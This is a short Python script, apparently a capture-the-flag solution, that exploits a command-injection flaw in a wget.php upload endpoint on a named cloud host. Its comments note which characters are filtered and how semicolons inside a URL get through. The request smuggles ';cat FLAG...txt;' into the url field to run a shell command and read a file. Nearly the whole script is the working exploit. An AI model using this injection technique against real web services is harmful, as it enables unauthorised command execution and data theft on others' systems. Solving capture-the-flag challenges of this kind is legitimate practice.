import requests

"""
using '$' : file not found
'`' : not allowed
so RCE ;)
using double ';' : http://tmp.ninja/;id;.gif
"""
url = "http://ec2-35-158-236-11.eu-central-1.compute.amazonaws.com/f2up/wget.php"
req = requests.post(url, data={'url': "http://tmp.ninja/;cat FLAG_HFIUJHOIFRHJROIHIOTH.txt;.gif"})
print(req.status_code)
print(req.headers)
print(req.text)